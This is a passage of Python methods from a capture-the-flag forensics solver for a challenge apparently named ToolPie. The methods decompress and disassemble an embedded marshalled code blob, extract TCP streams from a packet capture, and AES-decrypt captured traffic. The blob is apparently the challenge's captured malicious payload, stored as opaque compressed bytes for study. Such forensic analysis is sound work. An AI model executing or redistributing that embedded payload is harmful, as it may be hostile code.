	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def load_compressed_data(self):
        """
        Description:
            Challenge specific function to load the compressed data
        """
        self.compressed_data = b'BZh91AY&SY\x8d*w\x00\x00\n\xbb\x7f\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xee\xec\xe4\xec\xec\xc0?\xd9\xff\xfe\xf4"|\xf9`\r\xff\x1a\xb3\x03\xd1\xa0\x1e\xa9\x11\x07\xac\x9e\xef\x1e\xeez\xf5\xdb\xd9J\xde\xce\xa6K(\xe7\xd3\xe9\xcd\xa9\x93\rS@M\x134&\r\x11\x94xF\x11\xa6\x89\xb2\x99\xa6\x94\xf0\x1ai\xa1\xa6\x9a\x03AF\xd1\x1e\x9e\xa1\x9a\xa7\x89\xa6L\x84\xf5\x1ayC\xd44z\x993S h\r\x0f)\xe9\x03@\x03LG\xa9\xa0\x1a\x04DI\xe8\x19$\xf4\xc9\xe92a\xa3D\xc9\x9aL\x11\x81O\'\xa4\x9e\x935=M\xa4\xd0\xd1\xa6&F\x81\x93L\x86\x80\x00\x00\x06\x80\x00\x00\x00\x00\x00\x00\x00\x00\rM\t4\xd1\x80L\t\x91\x18\xa9\xe4\xc6\x94\xd8\xa7\xb5OS\xc9\xa4=#\xf54\xd4\x06j\x07\xa9\xeaz\x9a\x1e\xa1\xa0z\x86\x83M\x03jh\x00\x03A\xa6@\x1a\x00\x00\x03\xd4\x00\x1e\xa7\x944\x005=\x10\x93\x10\x9b@\x994\xc8\x99\xa3J\x1bM\x1ajyOF\xa6\x98\xcab\x0c\xd16\xa0m&\x8fH\xd3@44\x01\xa0\x00\r\x03@\x004\x19\x00\x00\x00\x004\x1a\x01U44\x00\x03@\xd0\x1a\x0044\xd0\x06@\x1a\x00\x004\xd0\x18\x98\x86@42d\x00h\x1ad\x00\x00\x00\x004h\x00\x00\x00`\x91$Bhh4`\x9a\x19\x04\xc3@\xa9\xedS\xf4S\xd2\x1b\xd4\xda&M&\xd2m#\xcai\xfa\x8c\x93e=@\x1e\x91\xa0z\x8cjh\xd1\xa6\x80\x00\xd0\x004\x1e\xa0\x01\xa0\x1a4i\xb54\xd3\x10\x1f\xdf\xcb\x98\x99\r\xa1\r\x8c`\xd86\x0cd\xe9\xc3\x06\x9bm6\xdbm\x1b\xf1"\xf0\xd2\xa7\xd5p,\x171gAcG]V\xcfvr\x9e\r\x9d=\x13?N\xfa\x8bw3l`\x0e\x1c\xda\xdc\xb0VU\xa0\xe7\x8df>$\x10\xb5\xf2+fu\xd6\xd5\xed\x9a\x9c|b\xb1\xc4\xd1P\xd0\x95\xf8\x10\xc0\xb8\xd2\x10\\ 9\x83UF#^H\x12\x12\x91\x98\x9c\x1d\x89BQ\x8eC\x92\x066\x8bDp\x8a\xaa\x03e%\xad\xc4\xe5o\x8f\x01\xa0\x11\x84\xac\xb8H\x01^\xb7\x84y\xed\x0cU\xb37\xd7[w\xddm\xf4\xf9\xdb\xee7\xa6\x98\xe2-A\xea\x1c\xd6\xbe\xbf1\xe2\x03\x89A:2\xb0n\x0b\xc169\x8a\xab\n\\\xa4\xa0\xbb{ \x11\xa7\x1e-\xbc,P`F\xad\x08\xe1\x8dY\x9b\x02,\x8cs#eg%\x97\x071\xda\xe8XA|>\xa1\xae\xaah%\xc4]\x95w*4i[\x85\xee\xee=\xcf\x935q\x02uo"\xaf\x81/\xc0\xca\xbdF;\xf6\xef\xaa\x99A/ \x91\xef\x0b\xe1\xd9\xa4`w\x9e\xc6\x88\xf2\xa9S\xe3\xa6x\xaf|\x0b*IE\x02\x8a(NL\x00]?\x12\x10p=w\xc6\x92G\x8a\xd2\xff\x17}~y3\xe3\xe9f\xf1\xff\xaf\xf2\xa5\xb9\xa5\xcc\xfd;W\xdd\x1e\xcd\x9e\x0bD5\x0b\x0f\xc6wFW\\\xd5\x8d Gh\xc1\n|x2\x99&\x8e\\\xa5Ba\x7f6!\x10\xe4\xd0p\x18\x90\x97k4\x1a\xec@\x1b~~\x8d\xfe\xee\x96\x07\x8f\xd6\xe1SS\xcdOv\x8c\x89\xd2I\x150\xa5\xdd\xaa>E\x07\xdb\xf8l\x97V\xa0\x1c\x8d\xd9\xa50\x17[h\xd1\x02\x08!f\xad\xea\xa0"\x88\xceC\x0c\x0fVG^\xc0\xea_\x10\xbd\xa1m{5IL\xbb\xd2\x9an\x07\xd9a\x98jgIwr&&\x06\x0c\x8aH\xe73\xdd\xb1\x050\x9f\x1f\x1f\xe1J\'\x9d\x8cY\xa8\x11\x0b\x08\x0fd*\xf2\x9d\xc2\x84$\x10\x8a\xd9\xc1\xe05\xecs\xdeC\x9a\xd1\xb7\x85\x0eNiJj2\x9ag\x12\x94M)\xd2\r\xf3\xa8\x84\xc9\xc2\x06\xe1\x14\xda\xd1\x1e\x1bV\x1a\x0b\xe666\xc6~V\x81/r\x98\x95\xf2g\xc7Mm<\xed\xb0\xe9ko\x01\xcb4\x88\x17\x84\x8a"J\x9bJ\x18\x0ch;\x84\tv\xcb\xbaEL\x99\xdf\xaa)q/t:45\xba\xbf\x84V\xf5\xb3\xad\x8c\xee\x11\xe2(\x18>\xea3\xa9\x98\xa8B\xcf\xb5\xdc\xed\xacI<\x90\x06\x1d0)Y@\x86\x07\x7f\xee\xb9\xf5{m\xdf\x83Hf\xb3T\xd2\xdf\x9c\xc6\xab\xac\x13\x99\xcb\xec\xf5K\xf2\x80\xce\x9fC\xf4w\xeb\x1fa\x08\xd8\r\x80<%\x90w\x8b\xe8}\x8d\xda\x96\xcf)\x1a\xbaD.\xa3\xc2\xe5E\xe3\xc9p\xa8&w\x10\x14\xc6$v-I\xd9\xbd\xcf\xbf\xe1\xce\x19\xcdf\x07\x0b\x7f\xd7\xc8:\xa6nw\xfc=M\\n\xc7\x02\x96\n\x85".j\xa8G}\x04\xef\x1e+\xb0)4\x82G_\x05\xfe\xbe\x94\xf3\x03\xd4*\xe2\xf7T\xa8\x97\x97\xc3X\x8a\x9a;\x9a\xbei\xc9\xad\xd1\xd2\xcf\xde4fpz\xce\rY\xa5\xa2s\xad\xf8(S\xf3*\x85\xea$\x14\x18\xb6\x1a\xbb\xc5.O\xc3\xb7\x89\xeb9\x1a4\xd3\xe0\x999r\x99\x9a(\x84\xce\x17\x0bk\xa59\xd2X\x88\x815\xab\x10x\x9f\xb7\xc5\xe7_R\xaa\xaa\xab\xf2\x9e\xe1\xb9\x8aK\x91\xa3\xa1\xa7\xc0\x94\x8f3\xca\x82\x8azY\xc4g\xed\xcf\xa9BO:`\xb5\x1b2\x12\xbb\x89\x17[m\xa2\xe8\xc4\x0ctJ/-\xa5\xbf\xf1\xffq\x7f\xda\x9a\xd9\x00\xb2\x0b\x98L\x7f\x17\xb4\xc9g}\x1e\xfeSh \xc3\x98fIq\x05]\xb1\x8aB\x98\xc7\x94\x03=2&\x06v@s\x0fX\xb3\xadZ\xcf\xac\xf6\xae\xe2\x0b\xaa\xe4\x99\xf3\xf5<\xd7\x81mu\x87\xb5\x97\xd2\xc3\xb4p\xb5\xad\xd9y\x15\xf2\x06,\xa7;\xe2\xe4\xcaH\xbf\xd5\x92@\xae\x0c\x91\xddD\x9by\xd5\xccj\x7f\xa9\x19\xad\xa3\x07\xbdI\x84\xa9|k/\x0f7=ji\x12\xba\xd4\xfaI\x8c\xa9\x94\n\x9b\xa43\x0e\xa6O\xd3\x8d\xf5\x83\x06\xd8\xaehhl\x05*;\xda\xaa\xd9he\xc8\x8f2!\x98\xd6-B\xa9\xcf\x9a\xb9_\xa4\xec\xda\x08<\xe3\r\xeem\x1el\xd8\xfc}3\xc4\xbal\xe5,P\xe4^\xae-\x97\x91j0\xec\xc8bB\x85\xd1.\xf5T\xa4\xf1\x83\x89\xc4-\\\x00\xf0\xbb\x1a\xd2\x89K\xb58\x96\xe2\x88\xdd<q\r\xbb0\xc4Ac\x95.v\x94\x08>\xca\x8b\xf5\xa1\xaf\x1fVH\x16\n\xfe+\x02\x9f\xe9\xa7VP\x1a\x03m\x01\xab\x0b\xf8\xd1&\xacq\xadg\x0f\xfc\x98N\x91XRQ\x88\xcf- 4K\x84q"\xec\xb2\x8c\xe6e\x86 \x9ff\x10\x83p\xc5\xc1C\xf4\x8c5\xda\xe5\x82)\xcf\n\xbfWZ\xc0\xd1\x9b`\xacFt\xba\xed\xaf#\xc8\xf8\x96\xe9=Zd\xa4h\xa3d>\xb2\xec\xac\x98\xe6%\xca\xb2r\xe2\xd7\xb5\x80\x8c\x1cb0\xadC\x8a\xdb\x1e\x1d\x9ek\xf0>\xcf\'7=\x9b\x19\xdee@\n\xaa\xac\xd2N%$\x91]\xa7\x13c\xe7\xce\x95\x96\x81Yh\nS\xd1\xdc\xb5\xe3d{\x13\xc5\xeau22\xcc\xec\xe1\x19\xb6\n\x8e?\n\x01\xdey\x04t\x02"@\x82\x12J\x88\x86\x1b\x83Un\x03Uy\xed\x82\xc3\x19\xdd\x86\r\xda\x1a\xde\x7f\x14\x90\xb3\xaf?\x05\xd3\xf0\x05\xe9\x85\x83\x99m\x8ae\x86\xd59Zl\x83i\x04u<\x92]\xe9\xca\xbc\xf5k\xcd\x8e,\xc1\xfcU\xc7\x84%|>\xfbt\x9c\x04\xf0}\xceQ|Wy\x9eN\xa8\x19#\x12\x94\xf1\xfdX5`\x19\x0e\x87NwC\xa5\x80p\xb1\xd9\xc73F\xe8\xa5\x9c\x00\xe5\xb1)\xd3]\xa6\r\x9d\x1a\xdd\xa4\x91\xb9z}\x1bg\x12\x9e<\nB\x88\x0e\xdf:\x1c\t\xc3\xa3\x85\x1b\x98y\xec\x0c\x9a\x12Pr\xcdC\xea1\x7f\x01\xef\xc3\xb0\xdd16\xe7\x1e\xf7\x1fv4\x17\r\xd3\x86\xceE@\xce\x15T\xce\x00\xf3@\xd9\r\x05\x19@V\x1c"\x86\xa6\x9c&,\x05\xa6%\x02n(^9\x86\xa65#\xc8\xb5]\x88\x8e\xa2,1\xc3u2\xe0\xa8 \x01\xff"|\xffG\x0b6\xbeU\x8a\xf7;YD\xda\xb4u)l\xf6~\'\x0e\x9b\xb3/\x98Q1\x04\x12JI[\x11*\x81\t\x07\xcb\xadw\xc9\xbf\xbf\xbe\xbaa\xc6\xce\x9e)\x98v\x15\x01j\xa15\xbd\xd0\xcb.\xe3\xd7\xa2`\x15\x9e\x854\xd3\x1am\r\x13A\x9a\xa5\x0b\r\x81\r\xb9\xb3%)Bmr\x12L\r>\x87\x07K\xea\xden\x87\x01c6%\xea\xa5\xd8\xb54\xc0\xca\xb8SBd{O\x9c \x88\x86\xee-80\x81Vv\x08[P\xc221\x9e &,t\x11/9\xe0\xd0\x1f\x1d\xcd\x94\xb9\x95\xc7V\xcb\xd6\xf2M\xf7\xf4gT\xa2\x19\x94\xd9\xfb\x7f\x15\x90\xc5\xb2&\x9e}\x0cq\xe8\xdc(\x1a{l\\\x88\xb8\xab=\x8b\xaaCm\xc0\xcb\xb5w=\xf8\xff\xa3\xdfY\x94\xa5\xa5\x9d0\x04U\x8al\xb8iw\xa3\xb0%\xf1 \x03H\x80\xc9$v\xe6\x98|#DYP\xa4\xfe\'\x04\xe0&\x88+\xeb\xce:\xa0cm,\x1aQ\xfdN\x1c\x97\xa3\x98\xb5q\x1c\xefE\xabEC\xaa\x82\x00\x8c\xcb\xee\x8d\xd6l\xe5\\\xca;\xf9d\xd4\xa5\xaen\xfaW=\x88kU9\xfe\x95&c\x13\x0cL7+5\xe2\xde_\x9f\xf6t\x05Hn\xe2\xff\x9dzi\x9a\x03@`u\xea\x98\xb5\x8e\xd9\xa3W\x85\x96O\x85\x9bf\xc1\xb6\xa4x\xa2/=\x0f\xa6T\xde\xac\xc6\x84\\\xa5q \x8eZ\xd5p*-qC%\xec\x85aH\x90>\xc1\x97%B@\x12B"u\xd5R\x0f\x10`&\x9ai\x1cl*F\xefOr\xaee\xaf\xa9\x88q\xa2k93\xe6\xf6\xf5\xa8n\xd0\xf42\xe5<\xf7}\xad\xdc\xd4)L\x11\x97\xd4\x92\x11E\xe1\xa0\xa4\xe4{\x9a\xe6T\xda \xee\x83\xb7\xce\x17\xb0\xb3\x0c\x11\x8f\xc1t\x0c\xb5\x87\x9e\xbb\x0f\x0fql\xe8T\xc5\x02+E\xdd\xbcQ\x92\xb8\xb8\xc8*,(K\tUk\x16\t\x86\xb9@\'\x04\xc1l&\xcf)\x1f\x14V\x0b\x80\xd2\r\xab\xec\x07) \x0c\x0f\x80\xee\x16\x14\xf9\x9c\xcbKE\xed`;5\xa9\xc2\x105X[\x87\xd6j\x95\x18\xcaY\x99\xba\xe6\xe8\x04q\x8344\xceW\x00\x05\xc4\x15\xfb\x82\xea9\xfcJ\xa3L\x8e\n\xc1\xb4\xb3sY\x84`\x98\x99\xccy\x0f{\x02P\x8e\n\xb3\xe5\xeclN\xa8\xb5]\x84!I\x80\xa4\x8at&\xe4eu\xba\x15T\x1fv\x90fx\x81P9\x1a\xf5G\xa9\xa2\x9c\xed\xc4W\xa0\xbb\xa5j\x1e\x1b\xd9%J\xb3z1I`\x19s\xd9\xb0\\\xca\xfdd\xd54!\x829\xc2|\x0c\xed\xdb\x0e\xde:\xcb%l-\xf6\x8f\xef\xde\xe2\xa5h\xb6e\xc5\xc7!\xc6 @B\x97.\xc2,~\xf8\x8a\x14\x94\xeb\x8emR\xf8\xfb\xa5"Qd\xc0\xe6\x81\xbe\x9fc=s\xd6,V\xca\xb1\x80!U\x8c\x82"\xddme\xbc=\xf9\x1b\xfc\x8d\xe6+\xc3\xc8:y\xe2\xfcZ\x1c\x88\x9f{\xdbZK\xb0#,\xb8\x9f\x10\xe1\x03\xb0H\x7f\x89w\xee\xd7\x9dvx\xafo\x98vge%\xdc"\xd1\x0f\x9dQ?\x83N\xe3\xb4\x14j%|C\x08\xb0\x16K\xc1H\x9d\xf8\xbc\xf4\xae\xa7\x8aA\xd0\xbfCM\x85w\x82)c\xcc\xd4\xcaV\xc52j\x14ObB&\xe7NQ\x9e\'93M\x8f`!\xcc\x80#%\x04\xd2\xeb"T\xbe\x8d0\x04\xa5\xad\xa3\xab\xf6\xd5\x86\xe214\xb1\xa6\x12\xa6*t\x94Q\x0c!\xc1\xe0#\x18\x8a\x81\xe4\x12A\xccK\xc6\xa3\xa9\xd0kh\xbb\x11m\xd7\\\xe6\xe8wr\x990\xc0\x83\x85\rC\x9d\xc8\xc7\xfcv\xf8Y/\x93\xc30NFe\xc2\xf7s\x91\xb7B\xa6\x10bb\x11\x18\xb0\x19\xf4\xa1X\xb9\x92\xb3\xdc+\x962\x9c\x0bt\xd9l,&\xe8\x1f\x0b\xfe\xf4\xb7\xcd\x0e\x11\xc9#Z\xb0\x90d2]\x06\x89\xcd\t\\\xa3\t\xad\x8d\x9b\xe5Z\xd0\xa6\xa73q{>_\xd7\xdd\xe21\x83\xa2k\x04DO\xc0Ag;Z\x99;\xdf\x14\x9e<\xe3v\x1d\x99\x8b\x9a\x98d\xe6\x05\xcd)\x94\xc2\x9b:F \xcdG\xdeP\x869\xdd)kg\xd2\xde*\x1a\x9c\x04\x10\x12z\xda4\x8d,\xcb\xec\xcbR\x99\x0f\x9c\x81\x08\xearz\xe5R\x17\'Y.=\x9el\xe9\xc4\xeew0\x08\x06\xc0g/m\xe0\xf04\x1c\x0c\xfcN\xc0Q\xaa\xbf\xc5\xe8\xa0y5\x88\x83\xdet\xa3\xce!e"\\\x13F\xeeo\xf7]\xcd\xa0t\x01F[h\xad\xa0a\xd7\x02\xda5\xcdo\xa9>\xf0\x88P\x9dM\xb3A\xc8\x92\xd6\x8b\x1b.\x8b\x8f\x9b\x8c\xda\x9cQ\xa1o\x14\xeb\'\xeb\x9f?\xf1\xd5\x87P\x0c\xb6g*\x1bqX\x93P=@\x1c\x0b\xab\xec\t\x1dq\xa9\x94\x16\x10u\x0ez\xc7\x9eG*\x12\x06K\xf5\xb8\x1ca\xe7 \x1a\xf0\xb5\xa8\x879\x86\x18\xe2\xb0\x96\xc1]~`ac[\xc2\xde\x83\xa5G2@[2\x96\xc5f\x7f\x17\xa7\n\x1b\x9cU\x06\x07;`\x96\xa31\t\xe8\x94t\xc0\xbdzW\xaeW\xb3^\xf4\x9e\xf6\x834\x0c\xb2"\x8e\x94\xda\xafp\xa4%N\x93\x045C\xa1`A\x02\xc1-h\x80\x8d\xb6\xc9d\xc5\xde\x98-\xa2\xbf\xafB\x8c\xd2\x9a\xbe\x98,\xc4\xfd\x93(V\xd1j\xd3\x1cA\xb5\xae\x7f\xae\x8e\x9c\xb0)\x8b5\x96\x0c\xffR\x9e\r\t\xae24\xf6\xf6\xfb\x85=\xc7\x8dd\xc8O1\xcb\xce\xb2*\x98\x1d\xb5LW\xaft\xcb\xcb\xbe)\xfc\xc0L\xacJ\x03\x95\x1b\x85\x94\xd0^\xe2uv/\x00\x10\r\'\x1e\xc7\xb5\xfd\xe7\xe6\xaf\x03\xa6\'\x88U\xab\xd9\xa85\x8a\xca\xd4\x84o\xb0\x83\xc4\xb9\x1a\xf4\x8c\xc0\xb9T\xae\x86\xa2cP[\x80D\x1a\x91z\xca\xb0\x83`4\x84\x8aM\';r\x91d%\x99\x89\xa7\x10Xp\xc8\x96\\\x82[\xe8\x9b\x01\xc0\xdd\x07\r\x10\xc7\x85\x83R\x04Tc\x1e\x99<)\xc9\x98`\x16\x9c\x82bl\xac\xa9I\xedh+P\xcc\xa7l\xb17\x97S\x1b\x83W\xbe\xa5|\x083ZJ\x80\xec\xcfm\xc8\xd9\x8b\x1a!\xbf\x0c\x14\x12<{f\xa2\xa0\x05u\xb2\xf9\xf2\x9a\xde\x95r\xa0\xf5>"\'\xe9\xe8\xae\x12\x1a\x12\x92Q\x11\x91\xa8"\xe2\xbf0\xb2\xe5Z\x88D\xe6\x01\x88#\xd3\xaa\xabV}\xbd\xd6Kh\x1aOG\x96*\xa0\xd7\xad\xd8\\h\xc3U\x80\x7f\xa0\xb3\x04\x86\x0f\xa4\xb2\xb5\xfb*VV\xa5\xab\xc5 \xba(U*\x1e8\xa7\xa1R\x17\xb5H\xcbh\xf8\x1d}\xf5I\xa7UY\xca8#\xf6k!&|>\x13(<\xb3\xcf;#\x8b\x11\x8e\x9f\x07I\x03 \x13\xf8\xde:\xceW\xc0,V\xc0X@\xd0\x02\x04bT+\xc3\xd0\x14uu\xeb\xbbE\xa4X\xef\xed\x1c(\x9a\xcc\xf9n+\xf0\xe0f\x9fv/v6\xed\xd2\xc6/\xca^\xd0\x8bt\xe9&\xdc\t\x93\x80\x8a\xa4F\xa6xn`\xb7\x9d\x86\xc7c\xa0Y1\xe6\x89\x92\x08h\x8b\xf8)8?\x13\n\xe6<\xd8\xea5\xec\x80\x01b\xc6\\\xbe\x90\x07\xc8.a\xca\xca\x91\xd8hQ\xb1\xc4\xf9\xf2\x1a\x95\x8c\xe1h0\r+\xb0:\xd4\x02$!PC\x83P\xe4L\x99\xb9\x16q\xd4\xa1\x98\rJ0\x97\xd7\xdb3|\x80\x81\xe8\xe1.\x00@\xa8\xca\xc7\xd5\xfcK\xc9\xaa\xc6\xec\xc7\x97\xbc\x99\xb6m\xf1\x87\x9aM\xbdO\xd3?\xbc\x97\x93\xaflr\x9c=\x8f\xce\xfe\xd4*\x03\x92?*T\x18<\x85\xc2+\x04\xc3@\x04\xf5\xf3\xc0ji#\xe4p\x18\xb5\xcd\x1f`b\x83\x99\xa3\xfc\x00?\x8fK\xbc\xa6g\xd9\x00\xd2v\xdf\x97+\xd3\x961\xa8zm\xe5\x9bP\x04\xf2L&? \xc0`\xb4\x00\xca\xf0a\xbe9C\x80b\x87E\x83\xceh\xf93t}[\x1f\x9a&\xfa\x0c\x1a`\xe5\xcc?e\xdb\x06\xe3<\xf7IGH\x9c]%hp\xec?$\x19\xb9O\xd1)\xb9\xb2\x0c\xb7\x03ZGX\xe3\x92\x08\xd2\xc9VBp,\xb7\xec\x943\x8a\xd2\x1f5A@HQ\x9d \x80\xa3p8\xf1\xa2M\x07|\x95n\xe3\x92k\xf9\xb5\xd0 \xa7\xc0\x85/\xfcC]\x04<\xd5\n5\x87\x11\x17\xe4o@\x9b*\xc0\n\xc3NkOh\xf8n \nj?\x9f=\xf5}\x06\x15h\x977A]\x0b\xb8\x94\xbe\xb0\xd7\xbe\xba\x8e\xb7\xafn\xa6\x9f#\x08?5\xde\xddm?\xec\xc6\xaa3\xd6jV\x0b.\xeam\xab\x94`\x95O\x13\x188\xc6\xc8I$9\x83\x7fil\xf2\xf9\x17\x19h\x93*\xbfk\xb2\xea#\xad\xbf\xcb\xe5{C\x15\xcef^\xca\x88\x99Wya\xac\x8c\xdb\x11\x16\xd9\x07\x05y\xe5C\xb4,\xc2\xc3\xcdP\xd2\xec\xe4\xceT$\xaa*\xa1&[[\x8d\xb7\xc5\x9b\xc3C\xba)_F\xba\xbd\xac<N7)g\x9f\xc1\xd8p\xab\'\xd9#K\x966z\xfc\x9d\xeb\xd7w\xb7\xd0\x89\xa4\xb9 \x88\x88\x846\xb5\xa1\x84J\xce\xa2\x0b\xe877\xf7\xf3\x17\x0c\xd3\xd0)\xe3\x07\xdcvm\xa0#\x96\xffx\xaa\xe6E_\x07aO\xefj\xba\xe3c\x9b\xdel$\x83h\x9e\tL\x1f\xa0}%"p\x9c\xd4\xd1\x9e\x8e\xfdf]\t\xac#\xbf\x15\x9c<\xf3-\xc2Zj\x99\xae\xc8.\xb3\x9d5\xfa\xe2\xae\xea\xba\xf4\xc63\x04Ot\xf9\x12\xd1{nMJB\x1b,\xbc\xbek\xa0\xca\xa6\xa5\x93/\x0f\xa1)Y\xb4v2L3\xa5\x8d\x0cq(\x0f\x18\x10\x82P-"\xe5\xe1\xe8\xb3\xa3SxJ\xcc\x0c\xdc\xae-n\xf7}w\x19\xae.\xcbi\\b\xdf0[\x10\xe9\x1a2xVZK\xd0S\x88\xd2c&+\xf7\x83Oj\x9d\xab\xb7Uh"z\x97\xf0\x9d\xa7\x92\xd6[(w\x0e)\xc8\xffM|\xa3j\xa15\xc7\x04\xe4Z\xd8\xa2\x88\x08\r\xea\x90J\xbaM\x01\xb0\xd2uQ\xc0\xa1\xcd\\\xadV\xe2\xf3.\x0bl\xe8\xa9^$\xc9\x95\xf6T\x13W\x18\x824\x016\xc8%,\x08\xbe\n\xa2\xd5AB\xdd5[=m7:\x06\xa0\x80\x86\x04\xb5\xe5E\x83K>qyY\x94S\xb8\xd80\xd6[\xc2\x84k\x0b\xdb\xec\x15\xb6\xcf-\'\xf0e@f\xa9Q6U\xcbi\x13N\xbas]3Q\xb1\x8diFP\xbb!P\xff\xd2\x82n\x98\x9dH^\xd6k\xd3\x8e%\xe0k\xca\x9b\xd4\xff\x90\xba-Q\x15\xa5\xd3\x14O\xe0\x12\x06]"\xb2\xa8\x82\xac`\'L\x98\xbd\xbcb;\xad\x13T\x95\x15o\x1a!\x89\xc3\xadN|z\x9bv\xf9\x98\x14\xca\xff\xe2\xeeH\xa7\n\x12\x11\xa5N\xe0\x00'

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def demarshalling(self):
        """
        Description:
            This function is used to demarshall the compressed data and display the disassembled code.
            Challenge specific function
        """
        self.load_compressed_data()
        data = bz2.decompress(self.compressed_data)
        code = marshal.loads(data)

        print(dis.dis(code))

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def dec_file_mes(self, mes, key):
        cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())

        return unpad(cypher.decrypt(mes), 16)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def decrypting_packet(self):
        """
        Description:
            Challenge specific function
        """
        # packet_data_path = self.folfil("data", "packet_1.data")

        ending_number = 79

        for num in range(78, ending_number + 1):
            packet_data_path = self.folfil("data", f"packet_{num}.data")

            with open(packet_data_path, "rb") as f:
                packet_data = f.read()

            decrypted_data = self.dec_file_mes(packet_data, self.encryption_key)
            print(f"Packet {num} :")
            print(decrypted_data)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def unified_extract_packets(self, pcap_file, pcap_function: str, raw: bool = False):
        """
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]

        Returns:
            dict: Dictionary of packets
        """

        packets = None
        # Dictionary to hold packets
        packets_dict = {}

        if pcap_function == "scapy":
            packets = rdpcap(pcap_file.as_posix())
        elif pcap_function == "pyshark":
            packets = pyshark.FileCapture(pcap_file.as_posix())

        if raw:
            return packets

        for i, packet in enumerate(packets):
            packets_dict[i + 1] = packet

        return packets_dict

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def smart_extract_packets(
        self,
        pcap_file,
        pcap_function: str,
        raw: bool = False,
        save: bool = False,
        filename_save: str = "packets.pickle",
        folder_save: str = "data",
    ):
        """
        Description:
            Extracts the packets from the pcap file and saves them as a dictionary.
            If the file already exists, it loads the file.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]
            raw (bool, optional): Option to return the raw packets. Defaults to False.
            save (bool, optional): Option to load saved file . Defaults to False.
            filename_save (str, optional): Filename to save the packets if enabled. Defaults to "packets.pickle".
            folder_save (str, optional): Folder to save the filename if save is enabled. Defaults to "data".
        """

        file_path = None

        if save:
            file_path = self.folfil(folder_save, filename_save)

        if file_path is None or file_path.exists() is False:
            # Read the pcap file

            packets = self.unified_extract_packets(pcap_file, pcap_function, raw=raw)

            # Save the packets
            if save:
                self.pickle_save_data(
                    packets, filename=filename_save, folder=folder_save
                )
        else:
            packets = self.pickle_load_data(file_path)
        return packets

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def custom_stream_extract(self, packets, stream_num=None):
        """
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            packets (dict): Dictionary of packets
            stream_num (int): Stream number to extract

        Returns:
            dict: Dictionary of packets
        """

        packets_scapy = self.smart_extract_packets(
            self.challenge_file,
            pcap_function="scapy",
            save=True,
            filename_save="packets_scapy.pickle",
        )

        packets_pyshark = self.smart_extract_packets(
            self.challenge_file,
            pcap_function="pyshark",
            save=True,
            filename_save="packets_pyshark.pickle",
        )

        packet_dict = {}
        for i, packet in packets_pyshark.items():
            if packet.tcp.stream == stream_num:
                packet_dict[i] = packets_scapy[i]
        return packet_dict

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pyshark_extrac_tcp_stream_numbers(self, pcap_file):
        """
        Description:
            Extracts the tcp stream numbers from the pcap

        Args:
            pcap_file (str): Path to the pcap file.

        Returns:
            dict: Dictionary of session indexes
        """
        # To save the stream indexes
        sess_index = {}
        cap = self.smart_extract_packets(
            pcap_file,
            pcap_function="pyshark",
            save=True,
            filename_save="packets_pyshark.pickle",
        )

        for i, pkt in enumerate(cap):
            if hasattr(pkt.tcp, "stream"):
                sess_index[i + 1] = pkt.tcp.stream
        return sess_index

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pyshark_extract_tcp_streams(self, pcap_file, stream_num):
        # To save the stream indexes
        packet_dict = {}
        cap = self.smart_extract_packets(
            pcap_file,
            pcap_function="pyshark",
            save=True,
            filename_save="packets_pyshark.pickle",
        )

        for i, pkt in enumerate(cap):
            if hasattr(pkt.tcp, "stream") and int(pkt.tcp.stream) == stream_num:
                packet_dict[i + 1] = pkt
        return packet_dict

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def testin_streams(self):
        # session_index = self.pyshark_extrac_tcp_stream_numbers(self.challenge_file)
        print("Extracting tcp stream")
        packets = self.pyshark_extract_tcp_streams(self.challenge_file, 4)
        print("Extracted Streams")
        # self.pickle_save_data(packets, "packets_stream_4.pickle")

        packet_keys = packets.keys()
        packet_keys = sorted(packet_keys)

        # print("Packet keys:", packet_keys)

        for i in range(packet_keys[0], packet_keys[0] + 7):
            print(f"Packet {i}:")
            print(packets[i].tcp.payload)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def get_scapy_tcp_stream(self, nunber: int):
        packets = self.smart_extract_packets(
            self.challenge_file,
            pcap_function="scapy",
            raw=True,
            save=True,
            filename_save="packets_scapy_raw.pickle",
        )
        stream = packets.sessions()
        return stream

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def custom_packet_997_attempt(self):
        stream_4 = self.custom_stream_extract(stream_num=4)
        decrypted_data = self.dec_file_mes(stream_4[997].load, self.encryption_key)
        # print(decrypted_data)
        md5_hash = hashlib.md5(decrypted_data).hexdigest()
        print("MD5 Hash of the byte string:", md5_hash)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def main(self):
        # self.demarshalling()
        # self.testin_streams()
        # self.save_encryption_key(self.key, self.folfil("data", "key.pem"))
        # packets = self.pickle_load_data("packets_dict.pickle")
        # packets_stream = self.pickle_load_data("packets_stream_4.pickle")
        # print(packets[76].load)
        # print(packets_stream[76])
        print(self.get_scapy_tcp_stream(4))

	# /home/figaro/CTF/Categories/Forensics/HTB/Wanter_Alive/payloads/solution.py
    def deobfuscation(self):

